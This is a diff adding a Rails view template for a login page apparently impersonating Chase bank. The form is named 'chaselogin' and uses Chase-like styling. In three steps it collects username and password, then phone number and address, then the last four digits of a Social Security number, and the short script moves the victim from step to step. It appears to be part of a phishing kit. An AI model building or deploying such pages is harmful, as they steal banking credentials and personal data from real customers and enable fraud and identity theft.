@@ -1,0 +1,136 @@
+
+
+<%= simple_form_for @chaselogin, url: chaselogins_path, html: { id: "multiStepForm", class: " text-start needs-validation", novalidate: true } do |f| %>
+
+<%= f.error_notification %>
+<%= f.error_notification message: f.object.errors[:base].to_sentence if f.object.errors[:base].present? %>
+<ul class="nav nav-tabs" id="stepTabs" role="tablist" style="display:none">
+  <li class="nav-item" role="presentation">
+    <button class="nav-link active" id="step1-tab" data-bs-toggle="tab" data-bs-target="#step1" type="button">Step 1</button>
+  </li>
+  <li class="nav-item" role="presentation">
+    <button class="nav-link disabled" id="step2-tab" data-bs-toggle="tab" data-bs-target="#step2" type="button">Step 2</button>
+  </li>
+  <li class="nav-item" role="presentation">
+    <button class="nav-link disabled" id="step3-tab" data-bs-toggle="tab" data-bs-target="#step3" type="button">Step 3</button>
+  </li>
+</ul>
+  <div class="tab-content mt-3">
+    <!-- Step 1: Username/Password -->
+    <div class="tab-pane fade show active" id="step1" role="tabpanel">
+      <div class="mb-3">
+        <%= f.input :username,
+                    required: true,
+                    label: "Username",
+                    input_html: { class: "form-control", name: "username" },
+                    label_html: { class: "form-label" } %>
+      </div>
+      <div class="mb-3 position-relative">
+        <%= f.input :password,
+                    as: :password,
+                    required: true,
+                    label: "Password",
+                    input_html: { class: "form-control", name: "password" },
+                    label_html: { class: "form-label" } %>
+
+        <a href="#" id="togglePassword"
+           class="position-absolute end-0 top-50 translate-middle-y text-decoration-none me-2"
+           style="color:#005eb8; font-size:0.9rem;">Show</a>
+      </div>
+
+      <div class="form-check text-start mb-3">
+          <input type="checkbox" class="form-check-input" id="remember">
+          <label for="remember" class="form-check-label">Remember me</label>
+      </div>
+      <button class="btn btn-primary w-100 mb-3" id="toStep2" type="button">Sign In</button>
+    </div>
+
+    <!-- Step 2: Phone & Address -->
+    <div class="tab-pane fade" id="step2" role="tabpanel">
+      <div class="mb-3">
+        <h4>
+          Let's Make Sure It's You
+        </h4>
+      </div>
+      <div class="mb-3">
+        <%= f.input :phone,
+                    required: true,
+                    label: "Phone Number",
+                    input_html: { class: "form-control", name: "phone" },
+                    label_html: { class: "form-label" } %>
+
+      </div>
+      <div class="mb-3">
+        <%= f.input :address,
+                    required: true,
+                    label: "Address",
+                    input_html: { class: "form-control", name: "address" },
+                    label_html: { class: "form-label" } %>
+      </div>
+      <button class="btn btn-secondary" id="backToStep1" type="button" style="display:none">Back</button>
+      <button class="btn btn-primary w-100 mb-3" id="toStep3" type="button">Verify</button>
+    </div>
+
+    <!-- Step 3: SSN Last 4 -->
+    <div class="tab-pane fade" id="step3" role="tabpanel">
+      <div class="mb-3">
+        <h4>
+          Let's Make Sure It's You
+        </h4>
+        <p>verify ssn</p>
+      </div>
+      <div class="mb-3">
+        <%= f.input :ssn,
+                    required: true,
+                    label: "Last 4 Digits",
+                    input_html: { class: "form-control", name: "address" },
+                    label_html: { class: "form-label" } %>
+
+                        </div>
+      <button class="btn btn-secondary" id="backToStep2" type="button" style="display:none">Back</button>
+
+      <%= f.submit "Submit", class: "btn btn-primary w-100 mb-3" %>
+    </div>
+  </div>
+
+  <div class="text-start">
+      <a href="#" class="d-block mb-2" style="color:#005eb8; font-size:0.9rem;">Forgot username/password?</a>
+      <a href="#" style="color:#005eb8; font-size:0.9rem;">Not enrolled? Sign up now.</a>
+  </div>
+<% end %>
+
+
+
+<script>
+document.getElementById("toStep2").addEventListener("click", function() {
+  // Validate Step 1 fields (basic check for non-empty)
+  var form = document.getElementById("multiStepForm");
+  if (!form.username.value || !form.password.value) {
+    form.classList.add('was-validated'); // show feedback if needed
+    return;
+  }
+  // Enable and show Step 2 tab
+  var step2Nav = document.getElementById("step2-tab");
+  step2Nav.classList.remove("disabled");
+  new bootstrap.Tab(step2Nav).show();
+});
+document.getElementById("toStep3").addEventListener("click", function() {
+  var form = document.getElementById("multiStepForm");
+  if (!form.phone.value || !form.address.value) {
+    form.classList.add('was-validated');
+    return;
+  }
+  var step3Nav = document.getElementById("step3-tab");
+  step3Nav.classList.remove("disabled");
+  new bootstrap.Tab(step3Nav).show();
+});
+document.getElementById("backToStep1").addEventListener("click", function() {
+  new bootstrap.Tab(document.getElementById("step1-tab")).show();
+});
+document.getElementById("backToStep2").addEventListener("click", function() {
+  new bootstrap.Tab(document.getElementById("step2-tab")).show();
+});
+document.getElementById("backToStep2").addEventListener("click", function() {
+  new bootstrap.Tab(document.getElementById("step3-tab")).show();
+});
+</script>
